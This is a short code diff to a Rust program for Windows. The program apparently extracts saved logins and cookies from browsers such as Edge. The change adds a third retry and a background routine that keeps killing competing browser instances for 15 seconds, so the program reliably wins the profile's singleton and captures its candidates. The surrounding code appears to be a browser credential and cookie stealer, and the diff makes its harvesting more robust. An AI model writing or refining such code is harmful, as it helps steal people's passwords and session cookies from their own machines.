@@ -120,9 +120,14 @@ fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)
     // handles; the loop only proceeds past `break` when it captured candidates.
     let mut pi = PROCESS_INFORMATION::default();
 
-    for attempt in 0..2 {
+    for attempt in 0..3 {
         if attempt > 0 {
-            crate::log_out!("[*] Retrying the {} phase (singleton handoff race suspected)", spec.name);
+            crate::log_out!(
+                "[*] Retrying the {} phase (attempt {}/{}, singleton handoff race suspected)",
+                spec.name,
+                attempt + 1,
+                3
+            );
         }
         process::ensure_no_instances(file_name(spec.exe), None);
 
@@ -142,6 +147,15 @@ fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)
         // profile's process singleton yet: kill any prelaunched instance Edge
         // spawned in the meantime, then let ours win the singleton handoff.
         process::ensure_no_instances(file_name(spec.exe), Some(pi.dwProcessId));
+
+        // Keep reaping prelaunched competitors while the browser claims the
+        // singleton and starts up. Child processes carry --type= and are
+        // never touched.
+        process::spawn_competitor_reaper(
+            file_name(spec.exe),
+            pi.dwProcessId,
+            Duration::from_secs(15),
+        );
 
         unsafe {
             if ResumeThread(pi.hThread) == u32::MAX {
